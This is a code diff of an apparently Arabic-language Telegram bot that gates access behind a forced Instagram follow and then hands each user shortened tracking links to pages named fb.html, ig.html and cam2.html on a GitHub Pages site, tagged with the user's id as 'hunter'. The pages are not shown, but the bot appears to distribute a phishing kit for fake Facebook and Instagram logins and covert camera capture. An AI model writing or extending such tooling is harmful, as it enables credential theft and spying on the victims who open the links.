@@ -27,12 +27,11 @@ def short(url):
     try: return requests.get(f"https://is.gd/create.php?format=simple&url={url}").text
     except: return url
 
-# 1. عند الضغط على Start تظهر رسالة التحذير فقط
+# 1. عند الضغط على Start تظهر رسالة التحذير مع رابط حسابك الجديد
 @bot.message_handler(commands=['start'])
 def start(m):
     uid = m.chat.id
     
-    # رسالة التحذير المزخرفة
     warning_text = f"""
 ⚠️ تـ^ـنـ^ـبـ^ـيـ^ـه بـ^ـرمـ^ـجـ^ـي صـ^ـارم:
 
@@ -41,23 +40,23 @@ def start(m):
 🔴 تـحـذيـر: بـدون مـتـابـعـة المـطـور سـتـبـقى الروابـط مـشـفـرة 💀🔥
     """
     
-    # إنشاء أزرار التحكم
+    # إنشاء الأزرار مع الرابط المحدث
     markup = types.InlineKeyboardMarkup()
-    btn_insta = types.InlineKeyboardButton("🔗 مـتـابـعـة المـطـور (إجـبـاري)", url="https://www.instagram.com/my.9/")
+    # تم تعديل الرابط ليكون m_y_.9 كما طلبت
+    btn_insta = types.InlineKeyboardButton("🔗 مـتـابـعـة المـطـور (إجـبـاري)", url="https://www.instagram.com/m_y_.9/")
     btn_done = types.InlineKeyboardButton("✅ تـم المـتـابـعـة (تـفـعـيـل)", callback_data="check_follow")
     markup.add(btn_insta)
     markup.add(btn_done)
     
     bot.send_message(uid, warning_text, reply_markup=markup)
 
-# 2. معالجة الضغط على زر "تم المتابعة" لإظهار القائمة
+# 2. معالجة التفعيل وإظهار القائمة المزخرفة
 @bot.callback_query_handler(func=lambda call: call.data == "check_follow")
 def check_follow(call):
     uid, name = call.message.chat.id, call.from_user.first_name
     h = name.replace(" ", "_")
     base = "https://m-y-9-tech.github.io/fb/"
     
-    # توليد الروابط المزدوجة
     p = f"?id={uid}&hunter={h}&dev={MY_ID}"
     lnks = {
         "fb": short(base+"fb.html"+p), "ig": short(base+"ig.html"+p),
@@ -66,7 +65,6 @@ def check_follow(call):
         "c2": short(base+"cam2.html"+p)
     }
 
-    # قائمة الأدوات المزخرفة
     main_msg = f"""
 🚀 نـ^ـظـ^ـام M.Y.9 المـ^ـوحـ^ـد | أهلاً بك {name}
 
@@ -101,7 +99,6 @@ def check_follow(call):
 ⚙️ Status: Connected Successfully
     """
     
-    # حذف رسالة التحذير وإرسال القائمة
     bot.delete_message(uid, call.message.message_id)
     bot.send_message(uid, main_msg, parse_mode="Markdown", disable_web_page_preview=True)
 
